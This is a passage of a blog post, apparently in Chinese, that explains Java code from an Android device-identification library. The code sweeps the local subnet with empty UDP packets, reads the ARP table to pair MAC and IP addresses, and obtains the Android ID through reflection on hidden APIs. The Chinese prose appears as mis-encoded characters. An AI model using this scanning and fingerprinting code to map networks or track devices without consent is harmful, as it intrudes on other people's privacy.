class="keyword">continue</span>;<span class="comment">// skip ipv6</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> ia.getHostAddress();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;127.0.0.1&quot;</span>.equals(ip)) &#123;</span><br><span class="line">                    hostIp = ia.getHostAddress();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">        Log.i(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;SocketException&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hostIp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><code>Enumeration nis = NetworkInterface.getNetworkInterfaces();</code></strong></p><ul><li>è¿™æ˜¯è·å–ç½‘ç»œä¿¡æ¯çš„å…³é”®å…¥å£ã€‚<code>NetworkInterface</code> ç±»ä»£è¡¨ä¸€ä¸ªç½‘ç»œæ¥å£ï¼Œå¦‚Wi-Fiç½‘å¡ (<code>wlan0</code>)ã€ç§»åŠ¨æ•°æ®ç½‘ç»œæ¥å£æˆ–ä»¥å¤ªç½‘å¡ (<code>eth0</code>)ã€‚</li><li><code>getNetworkInterfaces()</code> æ–¹æ³•è¿”å›ä¸€ä¸ª <code>Enumeration</code> (æšä¸¾) å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«äº†è®¾å¤‡ä¸Šæ‰€æœ‰å¯ç”¨çš„ç½‘ç»œæ¥å£ã€‚</li></ul><p><code>Enumeration&lt;InetAddress&gt; ias = ni.getInetAddresses();</code></p><p>å¯¹äºæ¯ä¸€ä¸ªç½‘ç»œæ¥å£ï¼Œè°ƒç”¨ <code>getInetAddresses()</code> æ–¹æ³•ã€‚ä¸€ä¸ªç½‘ç»œæ¥å£å¯èƒ½ç»‘å®šäº†å¤šä¸ªIPåœ°å€ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ª<code>IPv4</code>åœ°å€å’Œä¸€ä¸ªæˆ–å¤šä¸ª<code>IPv6</code>åœ°å€ï¼‰ã€‚æ­¤æ–¹æ³•è¿”å›åŒ…å«æ‰€æœ‰è¿™äº›åœ°å€çš„ <code>Enumeration</code> å¯¹è±¡</p><p>ä¸€æ—¦æ‰¾åˆ°äº†ä¸€ä¸ªæ—¢ä¸æ˜¯IPv6ä¹Ÿä¸æ˜¯æœ¬åœ°å›ç¯åœ°å€çš„IPï¼Œå°±å°†å…¶èµ‹å€¼ç»™ <code>hostIp</code> å˜é‡ï¼Œç„¶ååœæ­¢å¾ªç¯</p><p>ä½†æ˜¯è¿™é‡Œçš„ä»£ç å¹¶ä¸èƒ½ç¡®ä¿è·å–çš„IPv4å°±æ˜¯æœ¬æœº<code>ip</code>åœ°å€</p><p>å¯ä»¥è¿›è¡Œæ”¹è¿›ï¼š</p><ul><li><code>intf.getName().equalsIgnoreCase(&quot;wlan0&quot;)</code>: æ˜ç¡®æŒ‡å®šæŸ¥æ‰¾åä¸º â€œwlan0â€ çš„æ¥å£ï¼Œè¿™æ˜¯ç»å¤§å¤šæ•°Androidè®¾å¤‡ä¸ŠWi-Fiæ¥å£çš„åç§°ã€‚</li><li><code>intf.isUp()</code>: ç¡®ä¿è¿™ä¸ªç½‘ç»œæ¥å£æ˜¯â€œæ´»è·ƒâ€çš„ã€‚</li><li><code>!inetAddress.isLoopbackAddress()</code>: è¿™æ˜¯æ¯” <code>!&quot;127.0.0.1&quot;.equals(ip)</code> æ›´è§„èŒƒçš„åˆ¤æ–­å›ç¯åœ°å€çš„æ–¹æ³•ã€‚</li><li><code>inetAddress instanceof java.net.Inet4Address</code>: è¿™æ˜¯æ¯” <code>!(ia instanceof Inet6Address)</code> æ›´ç›´æ¥çš„åˆ¤æ–­IPv4çš„æ–¹å¼ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startScan</span><span class="params">(<span class="keyword">final</span> OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="comment">//å±€åŸŸç½‘å†…å­˜åœ¨çš„ipé›†åˆ</span></span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; ipList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·å–æœ¬æœºæ‰€åœ¨çš„å±€åŸŸç½‘åœ°å€</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">hostIP</span> <span class="operator">=</span> getHostIP();</span><br><span class="line">    <span class="keyword">if</span>(TextUtils.isEmpty(hostIP))</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> <span class="variable">lastIndexOf</span> <span class="operator">=</span> hostIP.lastIndexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">substring</span> <span class="operator">=</span> hostIP.substring(<span class="number">0</span>, lastIndexOf + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">DatagramPacket</span> <span class="variable">dp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            DatagramSocket socket;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">while</span> (position &lt; <span class="number">255</span>) &#123;</span><br><span class="line">                    Log.e(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;run: udp-&quot;</span> + substring + position);</span><br><span class="line">                    dp.setAddress(InetAddress.getByName(substring + String.valueOf(position)));</span><br><span class="line">                    socket.send(dp);</span><br><span class="line">                    position++;</span><br><span class="line">                    <span class="keyword">if</span> (position == <span class="number">125</span>) &#123;<span class="comment">//åˆ†ä¸¤æ®µæ‰åŒ…ï¼Œä¸€æ¬¡æ€§å‘çš„è¯ï¼Œè¾¾åˆ°236å·¦å³ï¼Œä¼šè€—æ—¶3ç§’å·¦å³å†å¾€ä¸‹å‘</span></span><br><span class="line">                        socket.close();</span><br><span class="line">                        socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                socket.close();</span><br><span class="line">                execCatForArp(listener);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„é€»è¾‘å‘ç”Ÿåœ¨ä¸‹æ–¹çš„runä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DatagramPacket</span> <span class="variable">dp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    DatagramSocket socket;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure><p><code>DatagramPacket dp = new DatagramPacket(new byte[0], 0, 0);</code></p><ul><li>åˆ›å»ºä¸€ä¸ªUDPæ•°æ®åŒ…ï¼ˆ<code>DatagramPacket</code>ï¼‰ã€‚è¿™ä¸ªæ•°æ®åŒ…çš„å†…å®¹æ˜¯ç©ºçš„ï¼ˆ<code>new byte[0]</code>ï¼‰ï¼Œå› ä¸ºå‘é€æ•°æ®æœ¬èº«ä¸é‡è¦ã€‚é‡è¦çš„æ˜¯<strong>å‘é€è¿™ä¸ªåŠ¨ä½œæœ¬èº«</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">while</span> (position &lt; <span class="number">255</span>) &#123;</span><br><span class="line">    Log.e(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;run: udp-&quot;</span> + substring + position);</span><br><span class="line">    dp.setAddress(InetAddress.getByName(substring + String.valueOf(position)));</span><br><span class="line">    socket.send(dp);</span><br><span class="line">    position++;</span><br><span class="line">    <span class="keyword">if</span> (position == <span class="number">125</span>) &#123;<span class="comment">//åˆ†ä¸¤æ®µæ‰åŒ…ï¼Œä¸€æ¬¡æ€§å‘çš„è¯ï¼Œè¾¾åˆ°236å·¦å³ï¼Œä¼šè€—æ—¶3ç§’å·¦å³å†å¾€ä¸‹å‘</span></span><br><span class="line">        socket.close();</span><br><span class="line">        socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">socket.close();</span><br><span class="line">execCatForArp(listener);</span><br></pre></td></tr></table></figure><p> <code>position</code>ä»2åˆ°254ï¼Œé¿å¼€ç½‘è·¯åœ°å€(.0)ã€å¸¸è§ç½‘å…³(.1)å’Œå¹¿æ’­åœ°å€(.255)</p><p><strong><code>dp.setAddress(InetAddress.getByName(substring + String.valueOf(position)));</code></strong></p><p>åœ¨å¾ªç¯ä¸­ï¼Œä¸ºUDPåŒ…è®¾ç½®ç›®æ ‡IPåœ°å€ï¼Œä¾‹å¦‚ <code>&quot;192.168.1.2&quot;, &quot;192.168.1.3&quot;, ...</code></p><p><strong><code>socket.send(dp);</code></strong></p><ul><li><strong>æ ¸å¿ƒæ“ä½œ</strong>ã€‚å‘ç›®æ ‡IPå‘é€è¿™ä¸ªç©ºçš„UDPåŒ…ã€‚å½“æ“ä½œç³»ç»Ÿæ‰§è¡Œè¿™ä¸ªå‘é€å‘½ä»¤æ—¶ï¼Œå®ƒéœ€è¦çŸ¥é“ç›®æ ‡IPå¯¹åº”çš„MACåœ°å€</li><li>å¦‚æœæ“ä½œç³»ç»Ÿçš„ARPç¼“å­˜ä¸­æ²¡æœ‰è¿™ä¸ªIPçš„è®°å½•ï¼Œå®ƒå°±ä¼šåœ¨å±€åŸŸç½‘ä¸­å¹¿æ’­ä¸€ä¸ª<code>ARP</code>è¯·æ±‚ï¼šâ€œè°æ˜¯ 192.168.1.xï¼Ÿè¯·å‘Šè¯‰æˆ‘ä½ çš„MACåœ°å€ã€‚â€</li><li>å¦‚æœç½‘ç»œä¸­å­˜åœ¨è¯¥IPçš„è®¾å¤‡ï¼Œå®ƒä¼šå“åº”è¿™ä¸ªARPè¯·æ±‚ã€‚</li><li><strong>æ— è®ºç›®æ ‡è®¾å¤‡æ˜¯å¦çœŸçš„åœ¨ç›‘å¬UDPç«¯å£ï¼Œåªè¦å®ƒå“åº”äº†ARPè¯·æ±‚ï¼Œå®ƒçš„IP-MACæ˜ å°„å…³ç³»å°±ä¼šè¢«è®°å½•åˆ°æœ¬æœºçš„ARPç¼“å­˜ä¸­ã€‚</strong></li></ul><p>**<code>if (position == 125) &#123; ... &#125;</code>**ç»éªŒä¼˜åŒ–ï¼Œåˆ†ä¸¤æ®µå‘åŒ…ï¼Œå¯ä»¥å­¦ä¹ ï¼</p><p>æœ€åæ‰§è¡Œ<code>execCatForArp</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ‰§è¡Œ catå‘½ä»¤ æŸ¥æ‰¾android è®¾å¤‡arpè¡¨</span></span><br><span class="line"><span class="comment"> * arpè¡¨ åŒ…å«ipåœ°å€å’Œå¯¹åº”çš„macåœ°å€</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">execCatForArp</span><span class="params">(<span class="keyword">final</span> OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                <span class="type">Process</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cat proc/net/arp&quot;</span>);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> exec.getInputStream();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Log.e(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;run: &quot;</span> + line);</span><br><span class="line">                    <span class="keyword">if</span> (!line.contains(<span class="string">&quot;00:00:00:00:00:00&quot;</span>) &amp;&amp; !line.contains(<span class="string">&quot;IP&quot;</span>)) &#123;</span><br><span class="line">                        String[] split = line.split(<span class="string">&quot;\\s+&quot;</span>);</span><br><span class="line">                        map.put(split[<span class="number">3</span>], split[<span class="number">0</span>]);</span><br><span class="line">                        <span class="comment">//                                Log.e(&quot;kalshen&quot;, &quot;run: &quot; + s1);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                mHandler.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        listener.scan(map);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å®Œå–„å®ŒARPè¡¨ä¹‹å<code>cat proc/net/arp</code></p><p>ç„¶å<code>map.put(split[3], split[0]);</code>å°†MACåœ°å€å’ŒIPåœ°å€åˆ†åˆ«ä½œä¸ºkeyå’Œvalueå­˜å‚¨åœ¨<code>map</code>ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ execCatForArp æ–¹æ³•çš„åå°çº¿ç¨‹ä¸­</span></span><br><span class="line">mHandler.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        listener.scan(map); <span class="comment">// è¿™è¡Œä»£ç å°†åœ¨ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>mHandleræ˜¯é€šè¿‡<code>private Handler mHandler = new Handler(Looper.getMainLooper());</code>æ¥è·å–ä¸»çº¿ç¨‹çš„Looperï¼Œç„¶åå°†è¿™ä¸ª <code>Runnable</code> å¯¹è±¡å‘é€åˆ° <code>mHandler</code> æ‰€ç»‘å®šçš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œä¹Ÿå°±æ˜¯<strong>ä¸»çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—</strong></p><p>ä¸»çº¿ç¨‹æœ‰ä¸€ä¸ªæŒç»­è¿è¡Œçš„ <code>Looper</code>ï¼Œå®ƒä¼šä¸æ–­åœ°ä»è‡ªå·±çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯æˆ– <code>Runnable</code> æ¥æ‰§è¡Œã€‚å½“ä¸»çº¿ç¨‹çš„ <code>Looper</code> å¤„ç†åˆ°æˆ‘ä»¬åˆšåˆšæŠ•é€’çš„è¿™ä¸ª <code>Runnable</code> å¯¹è±¡æ—¶ï¼Œå®ƒå°±ä¼šåœ¨<strong>ä¸»çº¿ç¨‹çš„ç¯å¢ƒä¸‹</strong>è°ƒç”¨è¯¥å¯¹è±¡çš„ <code>run()</code> æ–¹æ³•</p><p>è€Œè¿™ä¸ªscanæ–¹æ³•ï¼Œæ˜¯åœ¨è¿™ä¸ªæ¥å£å®šä¹‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OnScanListener</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">scan</span><span class="params">(Map&lt;String, String&gt; resultMap)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>getMac</code>ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getMac</span><span class="params">(IpScanner.OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="type">IpScanner</span> <span class="variable">ipScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IpScanner</span>();</span><br><span class="line">    ipScanner.startScan(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>listener</code>å¹¶æ²¡æœ‰è¢«å®ç°ï¼Œå› æ­¤è¿™ä¸ª<code>listener</code>çš„å¤„ç†æ˜¯é€šè¿‡ç”¨æˆ·å¤–éƒ¨ä¼ å…¥çš„ï¼Œå¤„ç†çš„å‚æ•°å°±æ˜¯æœ€åä¼ å‡ºæ¥çš„mapç»“æœ</p><h3 id="ShellAdbUtils-java"><a href="#ShellAdbUtils-java" class="headerlink" title="ShellAdbUtils.java"></a>ShellAdbUtils.java</h3><p><code>ShellAdbUtils</code> ç±»è¢«è®¾è®¡ä¸ºä¸å¯å®ä¾‹åŒ–ï¼Œå®ƒåªåŒ…å«é™æ€æ–¹æ³•å’Œé™æ€å¸¸é‡ï¼Œè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„å·¥å…·ç±»è®¾è®¡æ¨¡å¼</p><p>è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªç”¨äºåœ¨ Android è®¾å¤‡ä¸Šæ‰§è¡Œ Shell å‘½ä»¤çš„å·¥å…·ç±»</p><p>å®ƒå°è£…äº†é€šè¿‡ <code>Runtime.getRuntime().exec()</code> æ‰§è¡Œå‘½ä»¤çš„é€»è¾‘ï¼Œå¹¶æä¾›äº†æ£€æŸ¥ root æƒé™ã€ä»¥ root æˆ–æ™®é€šç”¨æˆ·èº«ä»½æ‰§è¡Œå•ä¸ªæˆ–å¤šä¸ªå‘½ä»¤çš„åŠŸèƒ½</p><h3 id="androidid"><a href="#androidid" class="headerlink" title="androidid"></a>androidid</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid.androidid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.provider.Settings;</span><br><span class="line"><span class="keyword">import</span> android.text.TextUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * androididè·å–</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IAndroidIdUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getAndroidId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        String androidId;</span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(androidId = ISettingUtils.getAndroidPropertyLevel1(context, Settings.Secure.ANDROID_ID))</span><br><span class="line">                || !TextUtils.isEmpty(androidId = ISettingUtils.getAndroidProperty(context, Settings.Secure.ANDROID_ID))) &#123;</span><br><span class="line">            <span class="keyword">return</span> androidId;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    getStringForUser æ˜¯ä¸€ä¸ªéšè—æ–¹æ³•ï¼ŒæŒ‰ç†è¯´ ç¬¬ä¸‰æ–¹ä¸èƒ½éšæ„ä¿®æ”¹ï¼Œå› ä¸ºç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ä¿®æ”¹ï¼Œè™½ç„¶å¯èƒ½å¯¼è‡´ROMä¸ç¨³å®šï¼Œä½†æ˜¯å®šåˆ¶ROMæˆ–è€…åšæ’ä»¶çš„ä¹Ÿè®¸ä¸å…³å¿ƒ</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getAndroidPropertyLevel1</span><span class="params">(Context context, String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> context.getContentResolver();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">mUserHandle</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.UserHandle&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getUserId</span> <span class="operator">=</span> mUserHandle.getDeclaredMethod(<span class="string">&quot;getUserId&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        getUserId.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">uid</span> <span class="operator">=</span> (<span class="type">int</span>) getUserId.invoke(<span class="literal">null</span>, Process.myUid());</span><br><span class="line"></span><br><span class="line">        HashSet&lt;String&gt; MOVED_TO_SECURE = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        HashSet&lt;String&gt; MOVED_TO_LOCK_SETTINGS = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        HashSet&lt;String&gt; MOVED_TO_GLOBAL = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Global</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Global&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Global.getDeclaredField(<span class="string">&quot;MOVED_TO_SECURE&quot;</span>);</span><br><span class="line">            field.setAccessible(<span 